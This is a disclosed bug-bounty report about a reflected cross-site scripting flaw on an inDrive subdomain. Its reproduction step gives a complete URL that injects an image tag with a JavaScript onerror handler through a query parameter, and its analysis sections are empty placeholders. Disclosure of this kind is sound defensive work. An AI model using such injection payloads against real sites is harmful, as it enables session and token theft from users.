---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2015074'
original_report_id: '2015074'
title: '#2 XSS on watchdocs.indriverapp.com'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: indrive
created_at: '2023-06-06T20:12:30.529Z'
disclosed_at: '2024-04-11T08:33:21.051Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 84
asset_identifier: '*.indriverapp.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# #2 XSS on watchdocs.indriverapp.com

## Metadata

- HackerOne Report ID: 2015074
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: indrive
- Disclosed At: 2024-04-11T08:33:21.051Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
I've found an XSS on https://watchdocs.indriverapp.com/

## Steps To Reproduce:


  1. Visit https://watchdocs.indriverapp.com/webview/v1?phone=████████&token=██████████&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22)%3E#/
  1. You'll get an XSS alert



## Supporting Material/References:
███

## Impact

Execute javascript on user browser

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
